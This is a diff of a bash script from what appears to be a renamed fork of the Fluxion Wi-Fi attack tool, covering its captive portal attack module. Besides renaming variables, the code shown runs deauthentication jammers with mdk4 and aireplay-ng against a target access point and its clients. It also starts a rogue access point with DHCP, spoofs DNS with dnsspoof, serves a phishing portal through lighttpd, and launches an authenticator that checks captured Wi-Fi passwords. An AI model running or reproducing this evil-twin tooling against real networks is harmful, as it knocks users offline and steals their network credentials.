+    echo -e "$CAPCAPVLine Configuration for external access point device:"
     echo
 
-    fluxion_target_show
+    capcap_target_show
 
-    echo -e "$FLUXIONVLine IPv4 Address: ${CaptivePortalGatewayAddress%.*}.2/24"
-    echo -e "$FLUXIONVLine IPv6 Address: Disabled"
-    echo -e "$FLUXIONVLine  DHCP Server: $CaptivePortalGatewayAddress"
-    echo -e "$FLUXIONVLine   DNS Server: $CaptivePortalGatewayAddress"
+    echo -e "$CAPCAPVLine IPv4 Address: ${CaptivePortalGatewayAddress%.*}.2/24"
+    echo -e "$CAPCAPVLine IPv6 Address: Disabled"
+    echo -e "$CAPCAPVLine  DHCP Server: $CaptivePortalGatewayAddress"
+    echo -e "$CAPCAPVLine   DNS Server: $CaptivePortalGatewayAddress"
     echo
 
-    echo -e "$FLUXIONVLine ${CYel}Assure external AP device is available & configured before continuing!${CClr}"
-    if [ ! "$FLUXIONAuto" ]; then
+    echo -e "$CAPCAPVLine ${CYel}Assure external AP device is available & configured before continuing!${CClr}"
+    if [ ! "$CAPCAPAuto" ]; then
       read -n1 -p "Press any key to continue... " bullshit
     fi
   fi
 
-  echo -e "$FLUXIONVLine $CaptivePortalStaringAPRoutesNotice"
+  echo -e "$CAPCAPVLine $CaptivePortalStaringAPRoutesNotice"
   captive_portal_set_routes &
   sleep 3
 
-  fuser -n tcp -k 53 67 80 443 &>> $FLUXIONOutputDevice
-  fuser -n udp -k 53 67 80 443 &>> $FLUXIONOutputDevice
+  fuser -n tcp -k 53 67 80 443 &>> $CAPCAPOutputDevice
+  fuser -n udp -k 53 67 80 443 &>> $CAPCAPOutputDevice
 }
 
 
@@ -1681,11 +1681,11 @@ if [ ! "$CaptivePortalCLIArguments" ]; then
   if ! CaptivePortalCLIArguments=$(
     getopt --options="a:j:s:c:u:h:n" \
       --longoptions="ap:,jammer:,ssl:,connectivity:,ui:,hash:,network-manager" \
-      --name="Captive Portal V$FLUXIONVersion.$FLUXIONRevision" -- "$@"
+      --name="Captive Portal V$CAPCAPVersion.$CAPCAPRevision" -- "$@"
     ); then
     echo -e "${CRed}Aborted$CClr, parameter error detected..."
     sleep 5
-    fluxion_handle_exit
+    capcap_handle_exit
   fi
 
   declare -r CaptivePortalCLIArguments=$CaptivePortalCLIArguments
@@ -1721,7 +1721,7 @@ done
 
 
 # ============================================================ #
-# ===================== < Fluxion Hooks > ==================== #
+# ===================== < CapCap Hooks > ==================== #
 # ============================================================ #
 attack_targetting_interfaces() {
   interface_list_wireless
@@ -1734,8 +1734,8 @@ attack_targetting_interfaces() {
 attack_tracking_interfaces() {
   # Determine required band from target channel.
   local __requiredBand=""
-  if [ "$FluxionTargetChannel" ]; then
-    local __ch=$(echo "$FluxionTargetChannel" | grep -oE '[0-9]+' | head -1)
+  if [ "$CapCapTargetChannel" ]; then
+    local __ch=$(echo "$CapCapTargetChannel" | grep -oE '[0-9]+' | head -1)
     if [ -n "$__ch" ] && [ "$__ch" -gt 14 ]; then
       __requiredBand="5GHz"
     fi
@@ -1786,7 +1786,7 @@ prep_attack() {
     "set_attack"
   )
 
-  if ! fluxion_do_sequence captive_portal sequence[@]; then
+  if ! capcap_do_sequence captive_portal sequence[@]; then
     return 1
   fi
 
@@ -1824,11 +1824,11 @@ load_attack() {
   # Rogue access point channel (may differ from the target's channel).
   CaptivePortalAccessPointChannel=${configuration[12]}
 
-  # Assure hash is relevant for fluxion's current target.
+  # Assure hash is relevant for capcap's current target.
   # If the hash is no longer relevant, clear to force reset.
   if [ \
-    "$targetHashSSID" != "$FluxionTargetSSID" -o \
-    "$targetHashMAC" != "$FluxionTargetMAC" ]; then
+    "$targetHashSSID" != "$CapCapTargetSSID" -o \
+    "$targetHashMAC" != "$CapCapTargetMAC" ]; then
     CaptivePortalHashPath=""
   fi
 }
@@ -1850,8 +1850,8 @@ save_attack() {
   echo "$CaptivePortalHashPath" >> "$configurationPath"
 
   # Target to verify validity of hash on restore.
-  echo "$FluxionTargetSSID" >> "$configurationPath"
-  echo "$FluxionTargetMAC" >> "$configurationPath"
+  echo "$CapCapTargetSSID" >> "$configurationPath"
+  echo "$CapCapTargetMAC" >> "$configurationPath"
   
   # Captive portal jammer type.
   CaptivePortalJammerType="${option_deauth}"
@@ -1866,20 +1866,20 @@ save_attack() {
 
 captive_portal_stop_jammer_service() {
   if [ "$CaptivePortalJammerServiceXtermPID" ]; then
-    fluxion_kill_lineage $CaptivePortalJammerServiceXtermPID
+    capcap_kill_lineage $CaptivePortalJammerServiceXtermPID
     CaptivePortalJammerServiceXtermPID=""
   fi
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk4_blacklist.lst"
+  sandbox_remove_workfile "$CAPCAPWorkspacePath/mdk4_blacklist.lst"
 }
 
 captive_portal_start_jammer_service() {
   if [ "$CaptivePortalJammerServiceXtermPID" ]; then return 0; fi
 
-  echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
+  echo -e "$CAPCAPVLine $CaptivePortalStartingJammerServiceNotice"
 
   local currentMode=$(iw dev "$CaptivePortalJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
   if [ "$currentMode" != "monitor" ]; then
-    interface_set_mode "$CaptivePortalJammerInterface" monitor &>> $FLUXIONOutputDevice
+    interface_set_mode "$CaptivePortalJammerInterface" monitor &>> $CAPCAPOutputDevice
     sleep 1
   fi
 
@@ -1891,7 +1891,7 @@ captive_portal_start_jammer_service() {
       ;;
     all)
       targetMode="all"
-      targetClients="${FluxionTargetClientsMAC[*]}"
+      targetClients="${CapCapTargetClientsMAC[*]}"
       ;;
     *)
       targetMode="subset"
@@ -1905,24 +1905,24 @@ captive_portal_start_jammer_service() {
 
   if [[ $option_deauth -eq 1 ]]; then
     if [ "$targetMode" = "subset" ]; then
-      printf '%s\n' $targetClients > "$FLUXIONWorkspacePath/mdk4_blacklist.lst"
-      fluxion_window_open CaptivePortalJammerServiceXtermPID \
-        "CAPCAPWIFI AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
-        "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\""
+      printf '%s\n' $targetClients > "$CAPCAPWorkspacePath/mdk4_blacklist.lst"
+      capcap_window_open CaptivePortalJammerServiceXtermPID \
+        "CAPCAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "mdk4 $CaptivePortalJammerInterface d -c $CapCapTargetChannel -b \"$CAPCAPWorkspacePath/mdk4_blacklist.lst\""
     else
-      fluxion_window_open CaptivePortalJammerServiceXtermPID \
-        "CAPCAPWIFI AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
-        "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -B $FluxionTargetMAC"
+      capcap_window_open CaptivePortalJammerServiceXtermPID \
+        "CAPCAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "mdk4 $CaptivePortalJammerInterface d -c $CapCapTargetChannel -B $CapCapTargetMAC"
     fi
   elif [[ $option_deauth -eq 2 ]]; then
     if [ "$targetClients" ]; then
-      fluxion_window_open CaptivePortalJammerServiceXtermPID \
-        "CAPCAPWIFI AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
-        "for client in $targetClients; do aireplay-ng -0 0 -a $FluxionTargetMAC -c \$client --ignore-negative-one $CaptivePortalJammerInterface & done; wait"
+      capcap_window_open CaptivePortalJammerServiceXtermPID \
+        "CAPCAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "for client in $targetClients; do aireplay-ng -0 0 -a $CapCapTargetMAC -c \$client --ignore-negative-one $CaptivePortalJammerInterface & done; wait"
     else
-      fluxion_window_open CaptivePortalJammerServiceXtermPID \
-        "CAPCAPWIFI AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
-        "aireplay-ng -0 0 -a $FluxionTargetMAC --ignore-negative-one $CaptivePortalJammerInterface"
+      capcap_window_open CaptivePortalJammerServiceXtermPID \
+        "CAPCAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "aireplay-ng -0 0 -a $CapCapTargetMAC --ignore-negative-one $CaptivePortalJammerInterface"
     fi
   fi
 }
@@ -1938,7 +1938,7 @@ captive_portal_resume_interface() {
 
 pause_attack() {
   if [ "$CaptivePortalState" != "Running" ]; then return 0; fi
-  echo "Pausing Captive Portal attack (target AP disappeared)." >> $FLUXIONOutputDevice
+  echo "Pausing Captive Portal attack (target AP disappeared)." >> $CAPCAPOutputDevice
   captive_portal_stop_jammer_service
   captive_portal_stop_interface
   CaptivePortalState="Paused"
@@ -1946,14 +1946,14 @@ pause_attack() {
 
 resume_attack() {
   if [ "$CaptivePortalState" != "Paused" ]; then return 0; fi
-  echo "Resuming Captive Portal attack (target AP reappeared)." >> $FLUXIONOutputDevice
+  echo "Resuming Captive Portal attack (target AP reappeared)." >> $CAPCAPOutputDevice
   captive_portal_resume_interface
   captive_portal_start_jammer_service
   CaptivePortalState="Running"
 }
 
 stop_attack() {
-  local -r CaptivePortalAuthSuccessFlag="$FLUXIONWorkspacePath/authenticator_success.flag"
+  local -r CaptivePortalAuthSuccessFlag="$CAPCAPWorkspacePath/authenticator_success.flag"
   local skip_authenticator_kill=0
 
   if [ -f "$CaptivePortalAuthSuccessFlag" ]; then
@@ -1976,40 +1976,40 @@ stop_attack() {
       CaptivePortalAuthenticatorServiceXtermPID=""
     fi
     
-    fluxion_kill_lineage "--signal SIGABRT" \
+    capcap_kill_lineage "--signal SIGABRT" \
       "captive_portal_authenticator\\.sh" &> /dev/null
-    pkill -9 -f "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" \
-      &>> $FLUXIONOutputDevice
+    pkill -9 -f "$CAPCAPWorkspacePath/captive_portal_authenticator.sh" \
+      &>> $CAPCAPOutputDevice
   fi
 
   captive_portal_stop_jammer_service
 
   # Kill captive portal web server log viewer.
   if [ "$CaptivePortalWebServiceXtermPID" ]; then
-    fluxion_kill_lineage $CaptivePortalWebServiceXtermPID
+    capcap_kill_lineage $CaptivePortalWebServiceXtermPID
     CaptivePortalWebServiceXtermPID="" # Clear service PID
   fi
 
   # Kill captive portal web server.
   if [ "$CaptivePortalWebServicePID" ]; then
-    fluxion_kill_lineage $CaptivePortalWebServicePID
+    capcap_kill_lineage $CaptivePortalWebServicePID
     CaptivePortalWebServicePID="" # Clear service PID
   fi
-  # Fallback: kill any lighttpd using fluxion's workspace config (handles daemon-restart edge cases).
-  pkill -f "lighttpd.*$FLUXIONWorkspacePath" &>/dev/null || true
+  # Fallback: kill any lighttpd using capcap's workspace config (handles daemon-restart edge cases).
+  pkill -f "lighttpd.*$CAPCAPWorkspacePath" &>/dev/null || true
 
   # Kill DNS service if one is found.
   if [ "$CaptivePortalDNSServiceXtermPID" ]; then
-    fluxion_kill_lineage $CaptivePortalDNSServiceXtermPID
+    capcap_kill_lineage $CaptivePortalDNSServiceXtermPID
     CaptivePortalDNSServiceXtermPID="" # Clear parent PID
   fi
 
   # Kill DHCP service.
   if [ "$CaptivePortalDHCPServiceXtermPID" ]; then
-    fluxion_kill_lineage $CaptivePortalDHCPServiceXtermPID
+    capcap_kill_lineage $CaptivePortalDHCPServiceXtermPID
     CaptivePortalDHCPServiceXtermPID="" # Clear parent PID
   fi
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/clients.txt"
+  sandbox_remove_workfile "$CAPCAPWorkspacePath/clients.txt"
 
   captive_portal_stop_interface
 
@@ -2017,30 +2017,30 @@ stop_attack() {
   if [ "$CaptivePortalNetworkManagerShutoff" != "disabled" ]; then
     if [ -x "$(command -v systemctl)" ]; then
       if [ "$CaptivePortalDisabledNetworkManager" ]; then
-        systemctl restart network-manager.service &>> $FLUXIONOutputDevice
-        systemctl restart networkmanager.service &>> $FLUXIONOutputDevice
-        systemctl restart networking.service &>> $FLUXIONOutputDevice
+        systemctl restart network-manager.service &>> $CAPCAPOutputDevice
+        systemctl restart networkmanager.service &>> $CAPCAPOutputDevice
+        systemctl restart networking.service &>> $CAPCAPOutputDevice
 
         # Reset disabled network-manager flag.
         CaptivePortalDisabledNetworkManager=""
       fi
       if [ "$CaptivePortalDisabledResolveD" ]; then
-        systemctl restart systemd-resolved.service &>> $FLUXIONOutputDevice
+        systemctl restart systemd-resolved.service &>> $CAPCAPOutputDevice
 
         # Reset disabled network-manager flag.
         CaptivePortalDisabledResolveD=""
       fi
     elif [ -x "$(command -v service)" ]; then
       if [ "$CaptivePortalDisabledNetworkManager" ]; then
-        service network-manager restart &>> $FLUXIONOutputDevice
-        service networkmanager restart &>> $FLUXIONOutputDevice
-        service networking restart &>> $FLUXIONOutputDevice
+        service network-manager restart &>> $CAPCAPOutputDevice
+        service networkmanager restart &>> $CAPCAPOutputDevice
+        service networking restart &>> $CAPCAPOutputDevice
 
         # Reset disabled network-manager flag.
         CaptivePortalDisabledNetworkManager=""
       fi
       if [ "$CaptivePortalDisabledResolveD" ]; then
-        service systemd-resolved restart &>> $FLUXIONOutputDevice
+        service systemd-resolved restart &>> $CAPCAPOutputDevice
 
         # Reset disabled network-manager flag.
         CaptivePortalDisabledResolveD=""
@@ -2064,34 +2064,34 @@ start_attack() {
     CaptivePortalDisabledResolveD=""
     # Start the network-manager if it's disabled.
     if [ -x "$(command -v systemctl)" ]; then
-      if systemctl status network-manager.service &>> $FLUXIONOutputDevice ||
-         systemctl status networkmanager.service &>> $FLUXIONOutputDevice; then
-        systemctl stop network-manager.service &>> $FLUXIONOutputDevice
-        systemctl stop networkmanager.service &>> $FLUXIONOutputDevice
+      if systemctl status network-manager.service &>> $CAPCAPOutputDevice ||
+         systemctl status networkmanager.service &>> $CAPCAPOutputDevice; then
+        systemctl stop network-manager.service &>> $CAPCAPOutputDevice
+        systemctl stop networkmanager.service &>> $CAPCAPOutputDevice
         CaptivePortalDisabledNetworkManager=1
       else
-        echo "No network managers appear to be running." >> $FLUXIONOutputDevice
+        echo "No network managers appear to be running." >> $CAPCAPOutputDevice
       fi
-      if systemctl status systemd-resolved.service &>> $FLUXIONOutputDevice; then
-        systemctl stop systemd-resolved.service &>> $FLUXIONOutputDevice
+      if systemctl status systemd-resolved.service &>> $CAPCAPOutputDevice; then
+        systemctl stop systemd-resolved.service &>> $CAPCAPOutputDevice
         CaptivePortalDisabledResolveD=1
       else
-        echo "No DNS resolvers appear to be running." >> $FLUXIONOutputDevice
+        echo "No DNS resolvers appear to be running." >> $CAPCAPOutputDevice
       fi
     elif [ -x "$(command -v service)" ]; then
-      if service network-manager status &>> $FLUXIONOutputDevice ||
-         service networkmanager status &>> $FLUXIONOutputDevice; then
-        service network-manager stop &>> $FLUXIONOutputDevice
-        service networkmanager stop &>> $FLUXIONOutputDevice
+      if service network-manager status &>> $CAPCAPOutputDevice ||
+         service networkmanager status &>> $CAPCAPOutputDevice; then
+        service network-manager stop &>> $CAPCAPOutputDevice
+        service networkmanager stop &>> $CAPCAPOutputDevice
         CaptivePortalDisabledNetworkManager=1
       else
-        echo "No network managers appear to be running." >> $FLUXIONOutputDevice
+        echo "No network managers appear to be running." >> $CAPCAPOutputDevice
       fi
-      if service systemd-resolved status &>> $FLUXIONOutputDevice; then
-        service systemd-resolved stop &>> $FLUXIONOutputDevice
+      if service systemd-resolved status &>> $CAPCAPOutputDevice; then
+        service systemd-resolved stop &>> $CAPCAPOutputDevice
         CaptivePortalDisabledResolveD=1
       else
-        echo "No DNS resolvers appear to be running." >> $FLUXIONOutputDevice
+        echo "No DNS resolvers appear to be running." >> $CAPCAPOutputDevice
       fi
     fi
   fi
@@ -2099,7 +2099,7 @@ start_attack() {
   captive_portal_start_interface
 
 
-  echo -e "$FLUXIONVLine $CaptivePortalStartingDHCPServiceNotice"
+  echo -e "$CAPCAPVLine $CaptivePortalStartingDHCPServiceNotice"
   # kea-dhcp4's PID file, lock file and lease file all live under paths
   # (/run/kea, /run/lock/kea, /var/lib/kea) that are normally created by
   # systemd's RuntimeDirectory=/StateDirectory= when the packaged service
@@ -2108,44 +2108,44 @@ start_attack() {
   # it's also what the distro's kea-dhcp4 AppArmor profile expects.
   mkdir -p /run/kea /run/lock/kea /var/lib/kea
   # Clear any previous log entries
-  > "$FLUXIONWorkspacePath/clients.txt"
-  fluxion_window_open CaptivePortalDHCPServiceXtermPID \
+  > "$CAPCAPWorkspacePath/clients.txt"
+  capcap_window_open CaptivePortalDHCPServiceXtermPID \
     "CAPCAPWIFI AP DHCP Service" "$TOPLEFT" "black" "#CCCC00" \
-    "KEA_LOCKFILE_DIR=/run/lock/kea kea-dhcp4 ${FLUXIONDebug:+-d }-c \"$FLUXIONWorkspacePath/kea-dhcp4.conf\" 2>&1 | tee -a \"$FLUXIONWorkspacePath/clients.txt\""
+    "KEA_LOCKFILE_DIR=/run/lock/kea kea-dhcp4 ${CAPCAPDebug:+-d }-c \"$CAPCAPWorkspacePath/kea-dhcp4.conf\" 2>&1 | tee -a \"$CAPCAPWorkspacePath/clients.txt\""
   echo "DHCP Service: $CaptivePortalDHCPServiceXtermPID" \
-    >> $FLUXIONOutputDevice
+    >> $CAPCAPOutputDevice
 
-  echo -e "$FLUXIONVLine $CaptivePortalStartingDNSServiceNotice"
-  fluxion_window_open CaptivePortalDNSServiceXtermPID \
+  echo -e "$CAPCAPVLine $CaptivePortalStartingDNSServiceNotice"
+  capcap_window_open CaptivePortalDNSServiceXtermPID \
     "CAPCAPWIFI AP DNS Service" "$BOTTOMLEFT" "black" "#99CCFF" \
-    "dnsspoof -i ${CaptivePortalAccessInterface} -f \"$FLUXIONWorkspacePath/hosts\""
+    "dnsspoof -i ${CaptivePortalAccessInterface} -f \"$CAPCAPWorkspacePath/hosts\""
   echo "DNS Service: $CaptivePortalDNSServiceXtermPID" \
-    >> $FLUXIONOutputDevice
+    >> $CAPCAPOutputDevice
 
-  echo -e "$FLUXIONVLine $CaptivePortalStartingWebServiceNotice"
+  echo -e "$CAPCAPVLine $CaptivePortalStartingWebServiceNotice"
   # Clear any previous log entries
-  > "$FLUXIONWorkspacePath/lighttpd.log"
+  > "$CAPCAPWorkspacePath/lighttpd.log"
   # Run lighttpd with -D (foreground, no fork) so $! captures the real PID.
-  lighttpd -D -f "$FLUXIONWorkspacePath/lighttpd.conf" \
-    &>> $FLUXIONOutputDevice &
+  lighttpd -D -f "$CAPCAPWorkspacePath/lighttpd.conf" \
+    &>> $CAPCAPOutputDevice &
   CaptivePortalWebServicePID=$!
 
-  fluxion_window_open CaptivePortalWebServiceXtermPID \
+  capcap_window_open CaptivePortalWebServiceXtermPID \
     "CAPCAPWIFI Web Service" "$BOTTOM" "black" "#00CC00" \
-    "tail -f \"$FLUXIONWorkspacePath/lighttpd.log\""
+    "tail -f \"$CAPCAPWorkspacePath/lighttpd.log\""
   echo "Web Service: $CaptivePortalWebServiceXtermPID" \
-    >> $FLUXIONOutputDevice
+    >> $CAPCAPOutputDevice
 
   captive_portal_start_jammer_service
   echo "Jammer Service: $CaptivePortalJammerServiceXtermPID" \
-    >> $FLUXIONOutputDevice
+    >> $CAPCAPOutputDevice
 
-  echo -e "$FLUXIONVLine $CaptivePortalStartingAuthenticatorServiceNotice"
-  fluxion_window_open CaptivePortalAuthenticatorServiceXtermPID \
+  echo -e "$CAPCAPVLine $CaptivePortalStartingAuthenticatorServiceNotice"
+  capcap_window_open CaptivePortalAuthenticatorServiceXtermPID \
     "CAPCAPWIFI AP Authenticator" "$TOPRIGHT" "black" "#CCCCCC" \
-    "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+    "$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
   echo "Auth Service: $CaptivePortalAuthenticatorServiceXtermPID" \
-    >> $FLUXIONOutputDevice
+    >> $CAPCAPOutputDevice
 }
 
 # FLUXSCRIPT END
